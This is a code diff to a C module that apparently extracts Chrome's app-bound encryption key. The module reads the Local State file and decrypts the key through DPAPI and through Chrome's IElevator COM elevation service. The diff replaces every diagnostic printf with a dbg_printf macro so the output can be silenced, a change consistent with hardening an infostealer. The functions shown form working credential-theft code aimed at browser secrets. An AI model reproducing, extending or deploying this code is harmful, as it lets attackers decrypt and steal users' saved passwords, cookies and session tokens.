@@ -17,6 +17,7 @@
  */
 
 #include "appbound.h"
+#include "config.h"
 #include "chrome_crypto.h"
 #include "utils/base64.h"
 #include <stdlib.h>
@@ -363,7 +364,7 @@ int appbound_try_dpapi(const unsigned char *blob, size_t blob_len,
 
     /* Version byte check (0x01 for Chrome DPAPI) */
     if (dpapi_blob[0] != 0x01) {
-        printf("[!] appbound_try_dpapi: version mismatch 0x%02x\n", dpapi_blob[0]);
+        dbg_printf("[!] appbound_try_dpapi: version mismatch 0x%02x\n", dpapi_blob[0]);
         return -1;
     }
 
@@ -374,7 +375,7 @@ int appbound_try_dpapi(const unsigned char *blob, size_t blob_len,
 
     if (!CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
         DWORD err = GetLastError();
-        printf("[!] CryptUnprotectData failed: %lu\n", err);
+        dbg_printf("[!] CryptUnprotectData failed: %lu\n", err);
         return -1;
     }
 
@@ -447,7 +448,7 @@ static int appbound_decrypt_flags(const unsigned char *decrypted, size_t dec_len
 
         /* ChaCha20-Poly1305 not supported on Windows (no BCrypt provider).
          * Skip — this flag is rare in practice. */
-        printf("[!] appbound_decrypt_flags: Flag2 ChaCha20 not supported on Windows\n");
+        dbg_printf("[!] appbound_decrypt_flags: Flag2 ChaCha20 not supported on Windows\n");
         return -1;
     }
 
@@ -459,7 +460,7 @@ static int appbound_decrypt_flags(const unsigned char *decrypted, size_t dec_len
         const unsigned char *nonce_iv = decrypted + pos;
 
         if (!ensure_ncrypt()) {
-            printf("[!] appbound_decrypt_flags: NCrypt load failed\n");
+            dbg_printf("[!] appbound_decrypt_flags: NCrypt load failed\n");
             return -1;
         }
 
@@ -512,7 +513,7 @@ static int appbound_decrypt_flags(const unsigned char *decrypted, size_t dec_len
     }
 
     default:
-        printf("[!] appbound_decrypt_flags: unknown flag %d\n", flag);
+        dbg_printf("[!] appbound_decrypt_flags: unknown flag %d\n", flag);
         return -1;
     }
 }
@@ -529,7 +530,7 @@ int appbound_decrypt_com(const unsigned char *encrypted_blob, size_t blob_len,
     /* Initialize COM */
     HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
     if (hr < 0) {
-        printf("[!] CoInitializeEx failed: 0x%lx\n", (unsigned long)hr);
+        dbg_printf("[!] CoInitializeEx failed: 0x%lx\n", (unsigned long)hr);
         return -1;
     }
 
@@ -538,7 +539,7 @@ int appbound_decrypt_com(const unsigned char *encrypted_blob, size_t blob_len,
     hr = CoCreateInstance(&guids->clsid, NULL, CLSCTX_LOCAL_SERVER,
                            &guids->iid_v1, (void **)&elevator);
     if (hr < 0 || !elevator) {
-        printf("[!] CoCreateInstance failed: 0x%lx\n", (unsigned long)hr);
+        dbg_printf("[!] CoCreateInstance failed: 0x%lx\n", (unsigned long)hr);
         CoUninitialize();
         return -1;
     }
@@ -552,7 +553,7 @@ int appbound_decrypt_com(const unsigned char *encrypted_blob, size_t blob_len,
                             NULL,
                             EOAC_DYNAMIC_CLOAKING);
     if (hr < 0) {
-        printf("[!] CoSetProxyBlanket failed: 0x%lx\n", (unsigned long)hr);
+        dbg_printf("[!] CoSetProxyBlanket failed: 0x%lx\n", (unsigned long)hr);
         elevator->lpVtbl->Release(elevator);
         CoUninitialize();
         return -1;
@@ -584,7 +585,7 @@ int appbound_decrypt_com(const unsigned char *encrypted_blob, size_t blob_len,
     SysFreeString(bstr_payload);
 
     if (hr < 0 || !plaintext_bstr) {
-        printf("[!] IElevator::DecryptData failed: hr=0x%lx err=%lu\n",
+        dbg_printf("[!] IElevator::DecryptData failed: hr=0x%lx err=%lu\n",
                (unsigned long)hr, (unsigned long)last_error);
         elevator->lpVtbl->Release(elevator);
         CoUninitialize();
@@ -594,7 +595,7 @@ int appbound_decrypt_com(const unsigned char *encrypted_blob, size_t blob_len,
     /* Extract 32-byte key from BSTR */
     UINT byte_len = SysStringByteLen(plaintext_bstr);
     if (byte_len < 32) {
-        printf("[!] IElevator returned short key: %u bytes\n", byte_len);
+        dbg_printf("[!] IElevator returned short key: %u bytes\n", byte_len);
         SysFreeString(plaintext_bstr);
         elevator->lpVtbl->Release(elevator);
         CoUninitialize();
@@ -644,7 +645,7 @@ int appbound_decrypt(const unsigned char *encrypted_blob, size_t blob_len,
         return 0;
     }
 
-    printf("[!] appbound_decrypt: all strategies failed\n");
+    dbg_printf("[!] appbound_decrypt: all strategies failed\n");
     return -1;
 }
 
@@ -659,7 +660,7 @@ int appbound_get_key(const char *local_state_path,
     size_t json_len = 0;
     unsigned char *json = read_file(local_state_path, &json_len);
     if (!json) {
-        printf("[!] appbound_get_key: failed to read %s\n", local_state_path);
+        dbg_printf("[!] appbound_get_key: failed to read %s\n", local_state_path);
         return -1;
     }
 
@@ -698,7 +699,7 @@ int appbound_get_key(const char *local_state_path,
     }
 
     free(json);
-    printf("[!] appbound_get_key: no encrypted key found in Local State\n");
+    dbg_printf("[!] appbound_get_key: no encrypted key found in Local State\n");
     return -1;
 }
 
